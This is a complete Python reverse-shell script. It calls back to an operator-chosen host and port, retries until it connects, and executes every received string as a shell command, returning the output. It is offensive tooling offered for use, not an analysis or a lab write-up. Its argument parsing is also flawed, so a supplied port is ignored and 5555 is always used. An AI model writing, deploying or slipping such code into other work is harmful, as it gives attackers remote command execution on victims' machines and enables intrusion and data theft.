import socket, os, subprocess, time, getopt, sys

host = ""
port = 0
active = True
connected = False
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def usage():
    usage = r"""
    Python Reverse Shell

    Usage: revshell.py -t target_host -p port

    Examples:
    revshell.py -t 192.168.0.1 -p 5555
    revshell.py -t 10.36.142.136 -p 5555
    """
    print(usage)

def connect():
    global s
    global connected

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while 1:
        try:
            print("[!] Trying to connect to %s:%s" %(host, port))
            s.connect((host, port))
            connected = True
            print("[*] Connection established!\n")
            print(str(os.getcwd()) + ">", end = "")
            s.send((str(os.getcwd()) + ">").encode())
            break
        except Exception as e:
            print("Error: " + str(e))
            print("Could not connect.")
            time.sleep(5)

def receive():
    global connected
    global active

    try:
        receive = s.recv(1024).decode()
    except Exception as e:
        print(e)
        connected = False
    if connected == True:
        if receive == "quit":
            active = False
            args = "Quitting..."
        elif len(receive) > 0:
            print(receive + "\n")
            if receive[:2] == "cd":
                try:
                    os.chdir(receive[3:])
                except Exception:
                    print("[!] Unable to change directory")
            proc2 = subprocess.Popen(receive,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE)

            stdout_value = (proc2.stdout.read() + proc2.stderr.read()).decode()
            args = stdout_value + "\n" + str(os.getcwd()) + ">"
            print(args, end = "")
        else:
            args = "No valid input was given."
        send(args)

def send(args):
    global connected

    args = args.encode()
    try:
        s.sendall(args)
    except Exception:
        connected = False
    receive()

def main():
    global host
    global port
    global s
    global connected
    global active

    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:",
        ["help","target","port"])
    except getopt.GetoptError as e:
        print(e)
        usage()
        sys.exit()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            active = False
        else:
            if o in ("-t", "--target"):
                print(o)
                host = a
                if o in ("-p", "--port"):
                    port = int(a)
                else:
                    print("No port provided, defaulting to port 5555.")
                    port = 5555
            else:
                print("no target")
                usage()
                sys.exit()

    if not opts:
        usage()
        sys.exit()

    while active:
        connect()
        receive()

    s.close()
    sys.exit()

main()
